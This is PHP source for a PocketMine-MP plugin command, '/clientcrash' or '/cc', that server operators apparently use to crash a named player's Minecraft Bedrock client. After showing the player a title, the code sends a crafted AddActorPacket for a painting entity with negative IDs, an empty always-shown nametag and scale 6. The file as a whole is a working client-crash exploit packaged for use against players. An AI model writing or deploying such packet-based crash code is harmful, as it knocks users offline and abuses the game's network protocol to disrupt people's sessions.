<?php


namespace BlackAngels56\ClientCrash\Command;


use BlackAngels56\ClientCrash\Main;
use pocketmine\command\CommandSender;
use pocketmine\network\mcpe\protocol\AddActorPacket;
use pocketmine\network\mcpe\protocol\types\entity\ByteMetadataProperty;
use pocketmine\network\mcpe\protocol\types\entity\EntityIds;
use pocketmine\network\mcpe\protocol\types\entity\EntityMetadataFlags;
use pocketmine\network\mcpe\protocol\types\entity\EntityMetadataProperties;
use pocketmine\network\mcpe\protocol\types\entity\FloatMetadataProperty;
use pocketmine\network\mcpe\protocol\types\entity\LongMetadataProperty;
use pocketmine\network\mcpe\protocol\types\entity\StringMetadataProperty;
use pocketmine\player\Player;
use pocketmine\scheduler\ClosureTask;
use pocketmine\Server;
use pocketmine\utils\TextFormat;

class ClientCrash extends BaseCommand
{


    public function __construct()
    {
        parent::__construct("clientcrash", "hardkick -> usage : /cc Player Reason ", null, ["cc"]);
    }

    public function execute(CommandSender $sender, string $commandLabel, array $args)
    {
        if ($sender->hasPermission($this->getPermission())) {
            if(count($args) < 1 ){
                $sender->sendMessage(TextFormat::YELLOW . $this->getDescription());
                return;
            }

            $player = Server::getInstance()->getPlayerExact($args[0]);
            unset($args[0]);
            $message = implode(" " ,$args);
            if($player)$this->crash($player,$message);
            else $sender->sendMessage(TextFormat::RED . "Player not found !");
        }
    }


    /**
     * @param Player $player
     * @param string $message
     */
    private function crash(Player $player,string $message)
    {
        $player->sendTitle($message);
        $pk = new AddActorPacket();
        $pk->actorUniqueId = -991;
        $pk->actorRuntimeId = -991;
        $pk->type = EntityIds::PAINTING;
        $pk->pitch = 0;
        $pk->yaw = 0;
        $pk->headYaw = 0;
        $pk->position = $player->getPosition();
        $pk->metadata = [
            EntityMetadataProperties::NAMETAG => new StringMetadataProperty( ''),
            EntityMetadataProperties::FLAGS => new LongMetadataProperty( 1 << EntityMetadataFlags::IMMOBILE),
            EntityMetadataProperties::ALWAYS_SHOW_NAMETAG =>new ByteMetadataProperty(1),
            EntityMetadataProperties::SCALE => new FloatMetadataProperty(6)];

        Main::getInstance()->getScheduler()->scheduleDelayedTask(new ClosureTask(function ()use($player,$pk){  $player->getNetworkSession()->sendDataPacket($pk); }),100);

    }
}